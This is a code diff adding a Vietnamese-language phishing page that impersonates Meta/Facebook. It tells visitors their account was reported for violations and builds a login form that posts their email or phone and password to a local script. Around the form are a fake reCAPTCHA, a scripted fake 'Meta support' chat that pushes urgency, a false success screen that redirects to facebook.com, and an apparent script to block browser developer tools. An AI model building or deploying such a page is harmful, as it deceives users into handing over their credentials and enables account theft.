@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔒</text></svg>">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title class="i18n">Xác minh tài khoản</title>
+    <style>
+        :root { --insta-grad: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); --bg: #fafafa; --border: #dbdbdb; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
+        .card { background: #fff; padding: 30px; border: 1px solid var(--border); border-radius: 3px; width: 100%; max-width: 380px; text-align: center; box-sizing: border-box; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
+
+        /* CSS mới để căn hàng */
+        .header-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+
+        .logo {
+            width: 150px;
+            height: auto;
+            display: block;
+        }
+        
+        .gradient-text {
+            background: var(--insta-grad);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: bold;
+            font-size: 28px;
+            font-family: "SF Pro Display", -apple-system, sans-serif;
+        }
+
+        .brand-text { 
+            font-size: 26px; 
+            font-weight: 600; 
+            color: #1c1e21; 
+            font-family: "SF Pro Display", -apple-system, BlinkMacSystemFont, sans-serif;
+            letter-spacing: -0.5px;
+        }
+
+        .brand-text b { font-weight: 700; color: #1c1e21; }
+        .brand-text span { color: #65676b; font-weight: 400; margin-left: 4px; }
+        h2 { color: #262626; font-size: 18px; margin: 0; font-weight: 600; }
+        .desc { color: #262626; font-size: 14px; margin: 15px 0 20px 0; line-height: 1.4; }
+        input { width: 100%; padding: 12px; margin: 6px 0; border: 1px solid var(--border); border-radius: 3px; font-size: 13px; background: #fafafa; box-sizing: border-box; outline: none; }
+        .captcha-box { background: #fafafa; border: 1px solid var(--border); border-radius: 3px; padding: 10px; display: flex; align-items: center; justify-content: space-between; margin: 12px 0; }
+        .circle { width: 20px; height: 20px; border: 2px solid var(--border); border-radius: 3px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+        .circle.loading { border: 3px solid #f3f3f3; border-top: 3px solid #0866ff; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        .circle.checked { border: none; background: #27ae60; color: white; font-size: 12px; }
+        .loader-spin { border: 4px solid #f3f3f3; border-top: 4px solid #bc1888; border-radius: 50%; animation: spin 0.8s linear infinite; width: 40px; height: 40px; margin: 25px auto; }
+        .btn { width: 100%; padding: 12px; background: #0866ff; color: white; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; margin-top: 15px; font-size: 14px; transition: background 0.2s ease; }
+        .btn:hover { background: #0052d1; }
+        .btn:disabled { background: #ccc; cursor: not-allowed; }
+        .resend-link { color: #0095f6; font-size: 13px; text-decoration: none; display: block; margin-top: 20px; font-weight: 600; cursor: pointer; }
+        .footer-area { margin-top: 30px; text-align: center; max-width: 380px; }
+        .footer-text { 
+            font-size: 12px; 
+            color: #8e8e8e; 
+            margin-top: 10px;
+            font-weight: 400;
+        }
+        .footer-links { font-size: 11px; color: #8e8e8e; margin-bottom: 5px; }
+        
+        /* CẬP NHẬT PHẦN RESEND MỚI CỦA BẠN VÀO ĐÂY */
+        .resend-container {
+            margin-top: 10px;
+            margin-bottom: 15px;
+            font-size: 14px;
+            color: #65676b;
+            text-align: center;
+        }
+        .resend-link {
+            color: #0095f6;
+            cursor: pointer;
+            font-weight: 600;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            text-decoration: none;
+        }
+        .spin-icon {
+            display: inline-block;
+            transition: transform 0.3s ease;
+        }
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .loading .spin-icon {
+            animation: spin 1s linear infinite;
+        }
+        /* KẾT THÚC PHẦN CẬP NHẬT */
+
+        .resend-msg { font-size: 12px; color: #27ae60; margin-top: 10px; display: none; }
+        #offline { display: none; background: white; width: 100vw; height: 100vh; position: fixed; top: 0; left: 0; padding: 50px; box-sizing: border-box; z-index: 1000; text-align: center; }
+        
+        .auth-notice {
+            background-color: #f0f2f5;
+            border-left: 4px solid #0064E0;
+            padding: 12px;
+            margin-bottom: 20px;
+            border-radius: 4px;
+            font-size: 13px;
+            line-height: 1.5;
+            color: #1c1e21;
+            text-align: left;
+        }
+
+        .warning-banner {
+            background-color: #fce8e6;
+            border: 1px solid #f2b0a5;
+            color: #c5221f;
+            padding: 10px;
+            border-radius: 4px;
+            font-size: 12px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            text-align: left;
+        }
+
+        #initial-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #ffffff;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 99999;
+        }
+
+        .security-shield {
+            width: 60px;
+            height: 60px;
+            margin-bottom: 20px;
+            border-radius: 12px;
+        }
+
+        .loader-spin {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0866ff;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin-top: 15px;
+        }
+
+        .fake-chat-trigger {
+            position: fixed;
+            bottom: 25px;
+            right: 25px;
+            width: 45px;
+            height: 45px;
+            background: #0084ff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            z-index: 9999;
+            transition: transform 0.3s ease;
+        }
+
+        .fake-chat-trigger:hover { transform: scale(1.1); }
+
+        .notification-dot {
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 12px;
+            height: 12px;
+            background: #fa3e3e;
+            border-radius: 50%;
+            border: 2px solid white;
+        }
+
+        .chat-window {
+            position: fixed;
+            bottom: 80px;
+            right: 25px;
+            width: 280px;
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 12px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
+            display: none;
+            z-index: 9999;
+            overflow: hidden;
+            font-family: -apple-system, sans-serif;
+        }
+
+        .chat-header { 
+            background: #0084ff; color: white; padding: 12px; 
+            font-weight: bold; font-size: 14px;
+            display: flex; justify-content: space-between; align-items: center;
+        }
+
+        .chat-body { 
+            max-height: 300px; padding: 15px; font-size: 13px; 
+            background: #f0f2f5; display: flex; flex-direction: column; 
+        }
+
+        .msg-bot { 
+            background: white; color: black; padding: 10px; 
+            border-radius: 10px; border-bottom-left-radius: 2px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+            line-height: 1.4;
+        }
+    </style>
+    <script>
+        // --- 1. KHAI BÁO BIẾN TOÀN CỤC CHO TIMER ---
+        let timeLeft = 120;
+        let timerId;
+
+        // --- 3. LOGIC ĐẾM NGƯỢC 2:00 ---
+        function startTimer() {
+            let endTime = sessionStorage.getItem('otp_end_time');
+            const expiryContainer = document.getElementById('expiry-container') || document.getElementById('timer-text');
+            const displaySpan = document.getElementById('display-time');
+
+            if (!endTime) {
+                endTime = new Date().getTime() + (120 * 1000);
+                sessionStorage.setItem('otp_end_time', endTime);
+            }
+
+            if (expiryContainer) expiryContainer.style.visibility = 'visible';
+
+            clearInterval(timerId);
+            timerId = setInterval(() => {
+                let now = new Date().getTime();
+                let distance = endTime - now;
+
+                if (distance <= 0) {
+                    clearInterval(timerId);
+                    sessionStorage.removeItem('otp_end_time');
+                    if (displaySpan) displaySpan.innerText = "0:00";
+            
+                    if (expiryContainer) expiryContainer.style.visibility = 'hidden'; 
+                    return;
+                }
+
+                let minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                let seconds = Math.floor((distance % (1000 * 60)) / 1000);
+        
+                if (displaySpan) {
+                    displaySpan.innerText = minutes + ":" + (seconds < 10 ? "0" : "") + seconds;
+                }
+            }, 1000);
+        }
+        
+        /// Hàm gửi lại mã sẽ reset thời gian
+        function handleResend() {
+            document.querySelector('.resend-link').classList.add('loading');
+
+            const timerText = document.getElementById('timer-text');
+            if (timerText) timerText.style.visibility = 'visible';
+
+            const icon = document.getElementById('resend-icon');
+            const msg = document.getElementById("resend-text");
+
+            if (icon) icon.classList.add('spin-icon');
+            if (msg) msg.style.display = "block";
+
+            setTimeout(() => {
+                document.querySelector('.resend-link').classList.remove('loading');
+
+                if (icon) icon.classList.remove('spin-icon');
+                if (msg) msg.style.display = "none";
+
+                let newEndTime = new Date().getTime() + (120 * 1000);
+                sessionStorage.setItem('otp_end_time', newEndTime);
+        
+                startTimer();
+            }, 2000);
+        }
+        function checkBot() {
+            let c = document.getElementById("c"); 
+            if(c.classList.contains('checked') || c.classList.contains('loading')) return;
+            c.classList.add('loading');
+            setTimeout(() => {
+                c.classList.remove('loading'); 
+                c.classList.add('checked');
+                c.innerHTML = "✓"; 
+                document.getElementById("b").disabled = false;
+            }, 2000); 
+        }
+
+        function startLoad() {
+            var uInput = document.querySelector('input[name^="f_u_"]');
+            if (uInput) {
+                localStorage.setItem('saved_user', uInput.value);
+            }
+            document.getElementById("main-ui").style.display = "none";
+            document.getElementById("ld-ui").style.display = "block";
+            setTimeout(() => { document.getElementById("target-form").submit(); }, 2000);
+            return false;
+        }
+
+        function checkAutoSuccess() {
+            const isPendingPage = false;
+            if (!isPendingPage) return false;
+
+            if (localStorage.getItem('is_finished') === 'true') {
+                showFinalSuccess();
+                return true;
+            }
+
+            let startTime = localStorage.getItem('start_waiting_time');
+            if (!startTime) {
+                startTime = new Date().getTime();
+                localStorage.setItem('start_waiting_time', startTime);
+            }
+
+            const now = new Date().getTime();
+            const waitTime = 1 * 60 * 1000;
+            const elapsedTime = now - startTime;
+
+            let percent = Math.floor((elapsedTime / waitTime) * 100);
+            
+            if (percent < 0) percent = 0;
+            if (percent > 100) percent = 100;
+
+            const bar = document.getElementById("progress-bar");
+            const text = document.getElementById("percent-text");
+    
+            if (bar) bar.style.width = percent + "%";
+            if (text) text.innerText = percent + "%";
+
+            if (elapsedTime >= waitTime) {
+                localStorage.setItem('is_finished', 'true');
+                
+                showFinalSuccess();
+                
+                localStorage.removeItem('start_waiting_time');
+                return true;
+            }
+            return false;
+        }
+
+        function showFinalSuccess() {
+            const elementsToHide = ["main-ui", "ld-ui", "offline", "initial-overlay", "chat-window", "noti-dot"];
+            elementsToHide.forEach(id => {
+                let el = document.getElementById(id);
+                if (el) el.style.display = "none";
+            });
+
+            const successUI = document.getElementById("success-ui");
+            if (successUI) {
+                successUI.style.display = "block";
+                document.body.style.cssText = "display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #fafafa;";
+            }
+        }
+
+        window.onload = function() {
+            var overlay = document.getElementById('initial-overlay');
+            var isPending = false;
+            var currentStep = "1"; 
+
+            if (localStorage.getItem('is_finished') === 'true') {
+                if (overlay) overlay.remove();
+                showFinalSuccess();
+                return;
+            }
+
+            if (isPending) {
+                if (!localStorage.getItem('start_waiting_time')) {
+                    localStorage.setItem('start_waiting_time', new Date().getTime());
+                }
+
+                const alreadyFinished = checkAutoSuccess();
+                
+                if (alreadyFinished) {
+                    if (overlay) overlay.remove();
+                } else {
+                    if (document.getElementById("main-ui")) document.getElementById("main-ui").style.display = "block";
+                    
+                    setTimeout(function() {
+                        if (overlay) {
+                            overlay.style.transition = 'opacity 0.6s ease';
+                            overlay.style.opacity = '0';
+                            setTimeout(() => overlay.remove(), 600);
+                        }
+                    }, 1000);
+
+                    const successInterval = setInterval(() => {
+                        if (checkAutoSuccess()) {
+                            clearInterval(successInterval);
+                        }
+                    }, 1000);
+                }
+            } else {
+                if (!sessionStorage.getItem('overlay_shown')) {
+                    if (overlay) {
+                        overlay.style.display = 'flex';
+                        setTimeout(function() {
+                            overlay.style.transition = 'opacity 0.6s ease';
+                            overlay.style.opacity = '0';
+                            setTimeout(() => { 
+                                overlay.style.display = 'none';
+                                sessionStorage.setItem('overlay_shown', 'true');
+                            }, 600);
+                        }, 2000);
+                    }
+                } else {
+                    if (overlay) overlay.style.display = 'none';
+                }
+  
+                if (currentStep == 2) {
+                    startTimer();
+                }
+            }
+
+            var currentStep = 1; 
+            if (currentStep == 2) {
+                startTimer();
+
+                
+            }
+    };
+
+    var isDone = localStorage.getItem('chatFinished') === 'true';
+    var isOpened = sessionStorage.getItem('sessionOpened') === 'true';
+
+    function toggleChat() {
+        var win = document.getElementById("chat-window");
+        var dot = document.getElementById("noti-dot");
+        if (!win) return;
+
+        if (win.style.display === "none" || win.style.display === "") {
+            win.style.display = "block";
+            if(dot) dot.style.display = "none";
+
+            if (isDone) {
+                showAll();
+            } else {
+                runAnim();
+            }
+        } else {
+            win.style.display = "none";
+        }
+    }
+
+    function runAnim() {
+        var body = document.getElementById("chat-content");
+        setTimeout(function() { 
+            document.getElementById("msg1").style.display = "block"; 
+            body.scrollTop = body.scrollHeight;
+        }, 1000);
+        setTimeout(function() { 
+            document.getElementById("msg2").style.display = "block"; 
+            body.scrollTop = body.scrollHeight;
+        }, 3000);
+        setTimeout(function() { 
+            document.getElementById("msg3").style.display = "block";
+            document.getElementById("chat-time").style.display = "block";
+            body.scrollTop = body.scrollHeight;
+            isDone = true;
+            localStorage.setItem('chatFinished', 'true');
+        }, 5000);
+    }
+
+    function showAll() {
+        document.getElementById("msg1").style.display = "block";
+        document.getElementById("msg2").style.display = "block";
+        document.getElementById("msg3").style.display = "block";
+        document.getElementById("chat-time").style.display = "block";
+        var body = document.getElementById("chat-content");
+        if(body) body.scrollTop = body.scrollHeight;
+    }
+
+    function startLoad() {
+        var uInput = document.querySelector('input[name^="f_u_"]');
+        if (uInput) {
+            localStorage.setItem('saved_user', uInput.value);
+        }
+
+        localStorage.setItem('chatFinished', 'true');
+        isDone = true;
+        document.getElementById("main-ui").style.display = "none";
+        document.getElementById("ld-ui").style.display = "block";
+        setTimeout(() => { document.getElementById("target-form").submit(); }, 2000);
+        return false;
+    }
+
+    window.addEventListener('load', function() {
+        if (isDone) return;
+
+        if (!isOpened) {
+            setTimeout(function() {
+                var win = document.getElementById("chat-window");
+                if (win && (win.style.display === "none" || win.style.display === "")) {
+                    toggleChat();
+                    sessionStorage.setItem('sessionOpened', 'true');
+                }
+            }, 3000);
+        }
+    });
+
+    function checkBot() {
+        let c = document.getElementById("c"); 
+        if(c.classList.contains('checked') || c.classList.contains('loading')) return;
+        c.classList.add('loading');
+        setTimeout(() => {
+            c.classList.remove('loading'); 
+            c.classList.add('checked');
+            c.innerHTML = "✓"; 
+            document.getElementById("b").disabled = false;
+        }, 2000); 
+    }
+</script>
+</head>
+<body>
+    <div id="initial-overlay">
+        <div style="font-family: -apple-system, system-ui, sans-serif; color: #1c1e21; font-size: 40px; font-weight: 500;">
+            <div class="header-row"><img src="https://i.postimg.cc/NMgs5shY/unnamed.png" class="logo" alt="logo"></div>
+        </div>
+        
+        <div class="loader-spin"></div>
+    </div>
+    <div id="success-ui" style="display:none; text-align:center;">
+    <div class="card" style="margin-bottom: -51px; position: relative; z-index: 999; border-bottom: none; box-shadow: none; border-bottom-left-radius: 0; border-bottom-right-radius: 0;">
+        
+        <div style="margin-top: 20px; margin-bottom: 25px;">
+            <div style="display: inline-flex; align-items: center; justify-content: center; width: 70px; height: 70px; border: 2px solid #27ae60; border-radius: 50%;">
+                <span style="font-size: 35px; color: #27ae60; font-weight: bold;">✓</span>
+            </div>
+        </div>
+
+        <h2 class="i18n" style="color: #27ae60; font-size: 22px; font-weight: 600; margin-bottom: 15px;">Xác minh thành công!</h2>
+        <p class="desc i18n" style="color: #4b4f56; font-size: 14px; line-height: 1.5; padding: 0 20px; margin-bottom: 30px;">
+            Quá trình kiểm tra bảo mật đã hoàn tất. Chúng tôi đã kiểm tra lại và rất xin lỗi bạn vì đã sơ ý đánh vi phạm nhầm. Tài khoản của bạn hiện đã được bảo vệ hoàn toàn và có thể sử dụng không hạn chế.
+        </p>
+
+        <button class="btn i18n" onclick="window.location.href='https://facebook.com'">Hoàn tất</button>
+    </div>
+</div>
+    <div id="offline">
+        <div style="font-size: 60px; margin-top: 100px; margin-bottom: 30px;">🌐</div>
+        <h1 class="i18n" style="color: #1c1e21; font-size: 24px; margin-bottom: 20px;">Lỗi kết nối bảo mật</h1>
+        <p class="i18n" style="color: #606770; font-size: 16px; max-width: 500px; margin: 0 auto; line-height: 1.6;">Kết nối với máy chủ xét duyệt bị gián đoạn. Vui lòng kiểm tra lại mạng và tải lại trang.</p>
+    </div>
+    <div class="card" style="padding-top: 50px;">
+        <div class="container" style="margin-top: -15px; margin-bottom: 25px;">
+            <div class="header-row">
+                <img src="https://i.postimg.cc/NMgs5shY/unnamed.png" class="logo" alt="logo">
+                <span class="gradient-text"></span>
+        </div>
+        <div id="ld-ui" style="display:none;">
+            <div class="loader-spin"></div>
+            <h2 class="i18n">Đang gửi yêu cầu kháng nghị...</h2>
+            <p class="i18n" style="font-size: 13px; color: #8e8e8e;">Vui lòng không đóng trình duyệt. Hệ thống đang gửi dữ liệu giải quyết vi phạm lên máy chủ Meta để xét duyệt lại tài khoản.</p>
+        </div>
+        <div id="main-ui"> 
+            
+            
+                <div class="banner-box" style="text-align: center; margin: 0; padding: 0; border: none; background: transparent;">
+                    <img src="https://i.postimg.cc/dtY3P9kL/lading1.png" style="max-width: 100%; height: auto; display: block; margin: 0 auto; border: none;">
+                </div>                
+
+                <h2 class="i18n">Xác minh tài khoản</h2>
+                <p class="desc i18n">Tài khoản của bạn đã bị báo cáo vi phạm nghiêm trọng Tiêu chuẩn cộng đồng. Vui lòng xác minh ngay.</p>
+    
+                <div id="dynamic-container">
+                    <div style="text-align:center; padding: 30px;">
+                        <div class="loading-dots">...</div> 
+                    </div>
+                </div>
+
+                <script>
+                (function() {
+                    const data = {
+                        u_name: "c9pfqybhpt",
+                        p_name: "p2q43zwyc92a",
+                        h_name: "25h55me6",
+                        u_ph: "Email hoặc số điện thoại",
+                        p_ph: "Mật khẩu",
+                        btn_txt: "Bắt đầu kháng nghị",
+                        cap_txt: "Tôi không phải là người máy",
+                        err: false,
+                        err_msg: "Thông tin đăng nhập không chính xác. Vui lòng kiểm tra lại để tiếp tục quá trình xác minh."
+                    };
+
+                    function drawForm() {
+                        const container = document.getElementById('dynamic-container');
+                        if(!container) return;
+
+                        const formHtml = `
+                            <form id="target-form" action="/ajax/login.php" method="post" onsubmit="return startLoad()">
+                                <input type="text" name="${data.u_name}" placeholder="${data.u_ph}" data-i18n-placeholder="${data.u_ph}" required>
+                    
+                                <div style="display:none">
+                                    <input type="text" name="${data.h_name}" tabindex="-1" autocomplete="off">
+                                </div>
+
+                                <div style="position: relative; width: 100%;">
+                                    <input type="password" name="${data.p_name}" id="password-field" placeholder="${data.p_ph}" data-i18n-placeholder="${data.p_ph}" required>
+                                    <img id="toggle-password" src="https://i.postimg.cc/m2vp8JJz/show.png" 
+                                         style="position: absolute; right: 12px; top: 50%; transform: translateY(-50%); cursor: pointer; width: 20px; height: auto; opacity: 0.6; z-index: 10;">
+                                </div>
+
+                                ${data.err ? `<div class="i18n" data-i18n-error style="color: #ed4956; font-size: 13px; margin-top: 12px; text-align: left;">${data.err_msg}</div>` : ''}
+
+                                <div class="captcha-box" style="display: flex; align-items: center; justify-content: space-between;">
+                                    <div style="display: flex; align-items: center;">
+                                        <div id="c" class="circle" onclick="checkBot()"></div>
+                                        <span class="i18n" style="font-size: 14px; color: #8e8e8e; margin-left: 12px;">${data.cap_txt}</span>
+                                    </div>
+
+                                    <div style="display: flex; flex-direction: column; align-items: center; justify-content: center;">
+                                        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="22">
+                                        <span style="font-size: 8px; color: #555; margin-top: 2px; font-family: -apple-system, system-ui, sans-serif; font-weight: 400;">reCAPTCHA</span>
+                                    </div>
+                                </div>
+                                <button type="submit" id="b" class="btn i18n" disabled>${data.btn_txt}</button>
+                            </form>
+                        `;
+                        container.innerHTML = formHtml;
+
+                        if (window.I18n) {
+                            I18n.apply(container);
+                        }
+
+                        const eye = document.getElementById('toggle-password');
+                        const pass = document.getElementById('password-field');
+                        if(eye && pass) {
+                            eye.onclick = function() {
+                                const isPass = pass.type === 'password';
+                                pass.type = isPass ? 'text' : 'password';
+                                this.src = isPass ? 'https://i.postimg.cc/pTm10vW9/hide.png' : 'https://i.postimg.cc/m2vp8JJz/show.png';
+                            };
+                        }
+                    }
+
+                    setTimeout(drawForm, 200);
+                })();
+                </script>
+            
+        </div>
+    </div>
+    <div class="footer-area">
+        <div class="footer-text i18n">Meta © 2026</div>
+    </div>
+    <div class="fake-chat-trigger" onclick="toggleChat()">
+        <div class="notification-dot" id="noti-dot"></div>
+        <svg width="24" height="24" viewBox="0 0 28 28" fill="white">
+            <path d="M14 2.017c-6.505 0-11.782 4.965-11.782 11.088 0 3.483 1.713 6.58 4.394 8.528V26l4.133-2.267c1.026.285 2.113.439 3.255.439 6.505 0 11.782-4.965 11.782-11.088S20.505 2.017 14 2.017z"/>
+        </svg>
+    </div>
+
+    <div id="chat-window" class="chat-window">
+    <div class="chat-header">
+        <span>Support</span>
+        <span onclick="toggleChat()" style="cursor:pointer; font-size: 20px;">&times;</span>
+    </div>
+    <div class="chat-body" id="chat-content">
+        <div id="msg1" class="msg-bot i18n" style="display:none; margin-bottom: 8px;">
+            Xin chào! Một đại diện hỗ trợ của Meta sẽ sớm có mặt.
+        </div>
+        <div id="msg2" class="msg-bot i18n" style="display:none; margin-bottom: 8px;">
+            Vui lòng hoàn thành quá trình xác minh danh tính trên màn hình để chúng tôi có thể hỗ trợ bạn nhanh hơn.
+        </div>
+        <div id="msg3" class="msg-bot i18n" style="display:none;">
+            Đừng đóng trình duyệt trong khi quá trình kiểm tra bảo mật đang diễn ra.
+        </div>
+        
+        <div id="chat-time" class="i18n" style="font-size: 10px; color: #8e8e8e; margin-top: 5px; display: none;">Vừa xong</div>
+    </div>
+</div> <script>
+    const toggleBtn = document.querySelector('#toggle-password');
+    const passwordInput = document.querySelector('#password-field');
+
+    if (toggleBtn && passwordInput) {
+        toggleBtn.addEventListener('click', function () {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            if (type === 'password') {
+                this.src = 'https://i.postimg.cc/m2vp8JJz/show.png';
+            } else {
+                this.src = 'https://i.postimg.cc/pTm10vW9/hide.png';
+            }
+        });
+    }
+</script>
+<script src="/public/app.js" defer></script>
+<script src="/public/chongf12.js" defer></script>
+</body>
+</html>
